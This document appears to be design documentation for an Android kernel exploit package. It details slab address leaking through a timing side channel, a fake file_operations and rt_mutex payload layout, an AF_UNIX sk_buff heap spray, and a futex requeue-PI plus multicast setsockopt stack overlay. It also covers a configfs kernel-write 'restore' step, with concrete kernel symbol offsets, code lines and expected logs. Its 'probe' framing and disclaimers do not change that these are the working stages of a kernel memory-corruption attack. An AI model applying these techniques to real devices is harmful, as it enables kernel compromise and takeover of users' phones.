# 03. mm/slab, payload, futex/rt_mutex, and 3.1 closure

This document explains the controlled observation surface in the 3.1 path: order-3 slab positioning, in-page payload geometry, futex/rt_mutex plus IP multicast side effect, fops route observation, and why restore and `route-summary` must be read together.

The discussion stays at probe mechanics and evidence boundaries. The source word `route` is an internal stage name; it is not a recommendation to continue into a post-route exploitation chain. The current package has no privilege stage, no persistence, no cross-model adaptation, and no second-stage behavior.

## mm/slab positioning

`rc_prepare_fops_page()` uses reclaimable `mm_struct` layout as the positioning surface:

1. Create clone children and open `/proc/<pid>/mem` to build a controlled number of `mm_struct` and memfd references.
2. Call `kernelsnitch_setup(RC_MM_SZ, 3, cpu_count, 8, 0, 0)`, with `RC_MM_SZ=0x3c0`, order 3, and target collision count 8.
3. `kernelsnitch_find_collisions()` records waiter timing and collision scan progress.
4. `kernelsnitch_bruteforce()` returns an `mm_struct`-near address.
5. `slab_base = leaked & ~0x7fff` estimates the order-3 slab page base.

Key logs:

```text
[*] prepare_kernel_page geom mode=0 standalone_tcp=0 main_tcp=1 mm_struct_sz=960 objs_per_slab=34 partials=13 collisions=8
[*] kernelsnitch waiters=512 target=... baseline=... threshold=... margin=4 elapsed_ms=...
[*] kernelsnitch collision-scan found=.../... elapsed_ms=...
[*] kernelsnitch collision-scan leaked mm=...
```

`PAGE_PREP_SLABS` defaults to 16. Supervisor retry raises it to 32; that increases preparation scale without changing the 3.1 goal.

## Payload geometry

The payload buffer is 64 KiB: two 32 KiB chunks. `RC_IMG_BIAS=0xe80` is the expected landing bias for the later sk_buff copy, so `payload_base` and `payload_bias` must be interpreted together.

| Name | Offset | Purpose |
| --- | ---: | --- |
| `RC_FOPS_OFF` | `0x1000` | fake `file_operations` table |
| `RC_LOCK_OFF` | `0x1350` | fake `rt_mutex` lock |
| `RC_SCRATCH_OFF` | `0x1700` | configfs write-window scratch |
| `RC_W0_OFF` | `0x2220` | fake top waiter |
| `RC_RIGHT_OFF` | `0x4440` | rb-tree right node |
| `RC_LEFT_OFF` | `0x5560` | rb-tree left node |
| `RC_TASK_OFF` | `0x5800` | minimal fake task fields |

The fake fops table fills only the slots used by the 3.1 observation path:

| fops slot | Value |
| --- | --- |
| `.llseek` | `fake_w0 + 24` |
| `.read` | `configfs_read_bin_file.cfi_jt` |
| `.write` / `.write_iter` | `configfs_write_bin_file.cfi_jt` |
| `.unlocked_ioctl` | `ashmem_ioctl.cfi_jt` |
| `.compat_ioctl` | `compat_ashmem_ioctl.cfi_jt` |
| `.mmap` | `ashmem_mmap.cfi_jt` |
| `.open` | `ashmem_open.cfi_jt` |
| `.release` | `ashmem_release.cfi_jt` |
| `.splice_read` | `generic_file_splice_read.cfi_jt` |
| `.show_fdinfo` | `ashmem_show_fdinfo.cfi_jt` |

`final payload invariant ok` means the user-space buffer is internally consistent across both chunks. It does not prove that the kernel page has that layout or that the target slot was written.

## AF_UNIX/sk_buff spray

The spray parameters are fixed in source:

| Constant | Value |
| --- | ---: |
| `RC_AF_PAIRS` | `64` |
| `RC_AF_MSGS` | `64` |
| Total sends | `4096` |
| Payload length | `0x8e80` |

Associated logs:

```text
[*] af_unix order3 staged pairs=64 requested=64
[*] sk_buff pcp send ret=65536 errno=0
[*] af_unix order3 spray sent=4096 requested=4096 payload=0x8e80 first_failure_ret=0 first_failure_errno=0
```

`sent=4096 requested=4096` is one necessary condition for a complete observation. If the count is lower, later route evidence should be downgraded.

## futex/rt_mutex and IP multicast side effect

`rc_run_main_route_threads()` creates three thread roles:

- waiter: holds `rc_f_pi_chain`, then enters `FUTEX_WAIT_REQUEUE_PI`.
- owner: holds `rc_f_pi_target`, then tries to lock `rc_f_pi_chain`, forming the PI chain.
- consumer: waits for release, then calls `sched_setattr()` on the waiter tid.

The main thread calls:

```c
futex_op(&rc_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &rc_f_pi_target, 0);
```

Then `rc_slide_ip_stack_copy()` uses the kernel stack copy behind `setsockopt(MCAST_JOIN_GROUP)` to form the overlay. The overlay parameters are logged:

```text
[*] slide ip enter fd=... attempts=1 arm_seq=1 post_hold=20000 group_req_size=0x88 marker_off=0x58 target=x28+0x38 value=... final_fops=1 full_waiter=0 overlay=marker
[*] slide final tree parent=... right=... left=0 pi_write=1
[*] slide ip overlay qwords 20=... 28=... 38=... 50=... 58=... 60=00000000000000ff
[*] slide ip seq=1 ret=... errno=... calls=1 sched_ok=1
[*] slide ip side effect calls=1 sched_ok=1
```

`sched_ok=1` means at least one consumer-side `sched_setattr` call succeeded. It is necessary side-effect evidence, not a standalone write proof. Return values such as `FUTEX_CMP_REQUEUE_PI ret=-1 errno=35` or `slide ip seq ret=-1 errno=22` should be read together with `sched_ok`, overlay fields, and restore.

## Restore closure

The 3.1 endpoint is not just `route_done=1`; it is restore followed by summary. The worker reopens ashmem and uses the configfs write window in the fake fops table to write back the original `ashmem_fops` pointer:

```c
uint64_t misc_fops = text_addr(ASHMEM_MISC_FOPS);
uint64_t original = kaslr_base + ASHMEM_FOPS_OFF;
rc_configfs_write_once(afd, misc_fops, &original, 8);
```

The target slot comes from `target.h`:

| Symbol | Value |
| --- | --- |
| `ASHMEM_MISC_FOPS_OFF` | `0x02c84ea8` |
| `KERNEL_DATA_ALIAS_BASE` | `0xffffff8000000000` |
| `ASHMEM_MISC_FOPS_ALIAS` | `0xffffff8002c84ea8` |
| `ASHMEM_FOPS_OFF` | `0x0258fbd8` |

Successful closure requires:

```text
[*] misc.fops restore target=... original=... ret=8 errno=0
[+] misc.fops restored to ashmem_fops — ashmem safe
[+] route-summary pid=... kaslr=1 base=... slide=... route_done=1
```

If restore is skipped, `ret != 8`, or ashmem cannot be opened, the run carries crash or later-access risk. Save stdout/logcat/dmesg immediately and, if necessary, recover with volume-down plus power.

## 3.1 evidence boundary

| Log | Supports | Does not support |
| --- | --- | --- |
| `slide-kaslr-perf-ok` | perf candidate base accepted | slab/payload success |
| `kernelsnitch ... leaked mm` | mm-near address and order-3 slab estimate | fake objects are active |
| `final payload invariant ok` | user-space payload consistency | kernel memory contains the same layout |
| `spray sent=4096` | complete sk_buff send count | target slot was written |
| `sched_ok=1` | route-thread side effect appeared | restore completed |
| `ret=8 errno=0` | 8-byte restore writeback completed | all middle stages were jitter-free |
| `route_done=1` | worker reached 3.1 endpoint | standalone vulnerability proof, privilege change, or second stage |

The strongest conclusion comes from correlation across these logs in the same run. The documentation does not inflate any single line into a standalone proof, and it does not extend the probe into a later exploitation chain.
